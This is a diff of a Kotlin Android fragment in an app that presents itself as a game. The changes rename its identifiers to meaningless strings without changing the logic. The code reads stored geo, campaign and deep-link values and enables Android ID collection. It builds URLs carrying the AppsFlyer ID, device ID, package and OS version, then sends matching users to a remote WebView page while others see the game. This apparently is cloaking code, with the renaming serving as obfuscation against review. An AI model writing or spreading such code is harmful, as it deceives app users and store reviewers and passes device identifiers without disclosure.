@@ -13,37 +13,31 @@ import androidx.fragment.app.Fragment
 import com.appsflyer.AppsFlyerLib
 import com.artifexmundi.bal.R
 import com.artifexmundi.bal.gaaamee.GaaimimiActivity
-import com.artifexmundi.bal.otther.Util.PACKKK
-import com.artifexmundi.bal.otther.Util.ad_id
-import com.artifexmundi.bal.otther.Util.apps
-import com.artifexmundi.bal.otther.Util.aps_id
-import com.artifexmundi.bal.otther.Util.codeCode
-import com.artifexmundi.bal.otther.Util.geoCo
-import com.artifexmundi.bal.otther.Util.instId
-import com.artifexmundi.bal.otther.Util.keyVAl
-import com.artifexmundi.bal.otther.Util.linkaa
-import com.artifexmundi.bal.otther.Util.myId
-import com.artifexmundi.bal.otther.Util.namm
-import com.artifexmundi.bal.otther.Util.one
-import com.artifexmundi.bal.otther.Util.subFive
-import com.artifexmundi.bal.otther.Util.subFour
-import com.artifexmundi.bal.otther.Util.subOne
-import com.artifexmundi.bal.otther.Util.subSix
-import com.artifexmundi.bal.otther.Util.trololo
-import com.artifexmundi.bal.otther.Util.urlMain
+import com.artifexmundi.bal.otther.Utilgtgtgt.hyjoyhjiiyh
+import com.artifexmundi.bal.otther.Utilgtgtgt.ad_id
+import com.artifexmundi.bal.otther.Utilgtgtgt.appsfrfrrfrf
+import com.artifexmundi.bal.otther.Utilgtgtgt.aps_idgtgt
+import com.artifexmundi.bal.otther.Utilgtgtgt.codeCode
+import com.artifexmundi.bal.otther.Utilgtgtgt.geoCoggt
+import com.artifexmundi.bal.otther.Utilgtgtgt.instIdgtgtg
+import com.artifexmundi.bal.otther.Utilgtgtgt.keyVAlgtgttg
+import com.artifexmundi.bal.otther.Utilgtgtgt.linkaagttgtg
+import com.artifexmundi.bal.otther.Utilgtgtgt.hyhyhyhy
+import com.artifexmundi.bal.otther.Utilgtgtgt.namm
+import com.artifexmundi.bal.otther.Utilgtgtgt.onegttg
+import com.artifexmundi.bal.otther.Utilgtgtgt.subFive56565
+import com.artifexmundi.bal.otther.Utilgtgtgt.subFourgt
+import com.artifexmundi.bal.otther.Utilgtgtgt.subOneggtgt
+import com.artifexmundi.bal.otther.Utilgtgtgt.subSixgttgg
+import com.artifexmundi.bal.otther.Utilgtgtgt.trololo
+import com.artifexmundi.bal.otther.Utilgtgtgt.urlMainghyyh
 import com.artifexmundi.bal.vieevmod.VebbbbActivity
 import org.koin.android.ext.android.inject
 import org.koin.core.qualifier.named
 
 
 class FilllFragment : Fragment() {
-    private lateinit var mContext: Context
-    val shareP: SharedPreferences by inject(named("SharedPreferences"))
 
-    override fun onAttach(context: Context) {
-        super.onAttach(context)
-        mContext = context
-    }
 
     override fun onCreateView(
         inflater: LayoutInflater, container: ViewGroup?,
@@ -52,66 +46,78 @@ class FilllFragment : Fragment() {
         return inflater.inflate(R.layout.fragment_filll, container, false)
     }
 
+    private lateinit var hjuujujujuj: Context
+    val sharePgttg: SharedPreferences by inject(named("SharedPreferences"))
+
+    override fun onAttach(context: Context) {
+        super.onAttach(context)
+        hjuujujujuj = context
+    }
+
     override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
+
+        val intentBeamgtgtgt = Intent(activity, VebbbbActivity::class.java)
+        val intentGamegtgtgt = Intent(activity, GaaimimiActivity::class.java)
+
         super.onViewCreated(view, savedInstanceState)
-        val count = shareP.getString(geoCo, null)
-        val appCamp = shareP.getString("appCamp", null)
-        val deepSt = shareP.getString("deepSt", null)
-        val countryDev = shareP.getString(codeCode, null)
-        val apps = shareP.getString(apps, null)
-        val wv = shareP.getString(urlMain, null)
-        val mainId = shareP.getString("mainId", null)
-        val pack = PACKKK
-        val buildVers = Build.VERSION.RELEASE
-        val myTrId = shareP.getString(myId, null)
-        val myInstId: String? = shareP.getString(instId, null)
+        val counthyyhhy = sharePgttg.getString(geoCoggt, null)
 
-        Log.d("lolo", "countryDev $countryDev")
-        Log.d("lolo", "count $count")
-        Log.d("lolo", "count $apps")
+        val appssss = sharePgttg.getString(appsfrfrrfrf, null)
+        val wvgtgtgt = sharePgttg.getString(urlMainghyyh, null)
+        val mainIdgtgtgt = sharePgttg.getString("mainId", null)
+        val appCamphyhyhy = sharePgttg.getString("appCamp", null)
+        val deepSthyhyhy = sharePgttg.getString("deepSt", null)
+        val countryDevaaa = sharePgttg.getString(codeCode, null)
+        val packgttggt = hyjoyhjiiyh
+        val buildVersgtgtgt = Build.VERSION.RELEASE
+        val myTrIdgtgtgtgt = sharePgttg.getString(hyhyhyhy, null)
+        val myInstIdgtgtgt: String? = sharePgttg.getString(instIdgtgtg, null)
 
-        val intentBeam = Intent(activity, VebbbbActivity::class.java)
-        val intentGame = Intent(activity, GaaimimiActivity::class.java)
+        Log.d("lolo", "countryDev $countryDevaaa")
+        Log.d("lolo", "count $counthyyhhy")
+        Log.d("lolo", "count $appssss")
 
-        val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(mContext)
+
+
+        val hhyhyhy = AppsFlyerLib.getInstance().getAppsFlyerUID(hjuujujujuj)
         AppsFlyerLib.getInstance().setCollectAndroidID(true)
 
-        shareP.edit().putString(aps_id, afId).apply()
+        sharePgttg.edit().putString(aps_idgtgt, hhyhyhy).apply()
 
-        val linkApps = "$wv$subOne$appCamp&$one$afId&$ad_id$mainId&$subFour$pack&$subFive$buildVers&$subSix$namm"
-        val linkMT = "$wv$one$myTrId&$ad_id$myInstId&$subFour$pack&$subFive$buildVers&$subSix$namm"
-        val linkFB = "$wv$subOne$deepSt&$one$afId&$ad_id$mainId&$subFour$pack&$subFive$buildVers&$subSix$trololo"
-        val linkFBNullApps = "$wv$subOne$deepSt&$one$myTrId&$ad_id$myInstId&$subFour$pack&$subFive$buildVers&$subSix$trololo"
+        val linkAppsgtgtgt = "$wvgtgtgt$subOneggtgt$appCamphyhyhy&$onegttg$hhyhyhy&$ad_id$mainIdgtgtgt&$subFourgt$packgttggt&$subFive56565$buildVersgtgtgt&$subSixgttgg$namm"
+        val linkMTgtgtgt = "$wvgtgtgt$onegttg$myTrIdgtgtgtgt&$ad_id$myInstIdgtgtgt&$subFourgt$packgttggt&$subFive56565$buildVersgtgtgt&$subSixgttgg$namm"
+        val linkFBgtgttg = "$wvgtgtgt$subOneggtgt$deepSthyhyhy&$onegttg$hhyhyhy&$ad_id$mainIdgtgtgt&$subFourgt$packgttggt&$subFive56565$buildVersgtgtgt&$subSixgttgg$trololo"
+        val linkFBNullAppsgtgt = "$wvgtgtgt$subOneggtgt$deepSthyhyhy&$onegttg$myTrIdgtgtgtgt&$ad_id$myInstIdgtgtgt&$subFourgt$packgttggt&$subFive56565$buildVersgtgtgt&$subSixgttgg$trololo"
 
-        when(apps) {
+        when(appssss) {
             "1" ->
-                if(appCamp!!.contains(keyVAl)) {
-                    shareP.edit().putString(linkaa, linkApps).apply()
-                    shareP.edit().putString("WebInt", "campaign").apply()
-                    startActivity(intentBeam)
+                if(appCamphyhyhy!!.contains(keyVAlgtgttg)) {
+                    sharePgttg.edit().putString(linkaagttgtg, linkAppsgtgtgt).apply()
+                    sharePgttg.edit().putString("WebInt", "campaign").apply()
+                    startActivity(intentBeamgtgtgt)
                     activity?.finish()
-                } else if (deepSt!=null||countryDev!!.contains(count.toString())) {
-                    shareP.edit().putString(linkaa, linkFB).apply()
-                    shareP.edit().putString("WebInt", "deepLink").apply()
-                    startActivity(intentBeam)
+                } else if (deepSthyhyhy!=null||countryDevaaa!!.contains(counthyyhhy.toString())) {
+                    sharePgttg.edit().putString(linkaagttgtg, linkFBgtgttg).apply()
+                    sharePgttg.edit().putString("WebInt", "deepLink").apply()
+                    startActivity(intentBeamgtgtgt)
                     activity?.finish()
                 } else {
-                    startActivity(intentGame)
+                    startActivity(intentGamegtgtgt)
                     activity?.finish()
                 }
             "0" ->
-                if(deepSt!=null) {
-                    shareP.edit().putString(linkaa, linkFBNullApps).apply()
-                    shareP.edit().putString("WebInt", "deepLinkNOApps").apply()
-                    startActivity(intentBeam)
+                if(deepSthyhyhy!=null) {
+                    sharePgttg.edit().putString(linkaagttgtg, linkFBNullAppsgtgt).apply()
+                    sharePgttg.edit().putString("WebInt", "deepLinkNOApps").apply()
+                    startActivity(intentBeamgtgtgt)
                     activity?.finish()
-                } else if (countryDev!!.contains(count.toString())) {
-                    shareP.edit().putString(linkaa, linkMT).apply()
-                    shareP.edit().putString("WebInt", "geo").apply()
-                    startActivity(intentBeam)
+                } else if (countryDevaaa!!.contains(counthyyhhy.toString())) {
+                    sharePgttg.edit().putString(linkaagttgtg, linkMTgtgtgt).apply()
+                    sharePgttg.edit().putString("WebInt", "geo").apply()
+                    startActivity(intentBeamgtgtgt)
                     activity?.finish()
                 } else {
-                    startActivity(intentGame)
+                    startActivity(intentGamegtgtgt)
                     activity?.finish()
                 }
         }
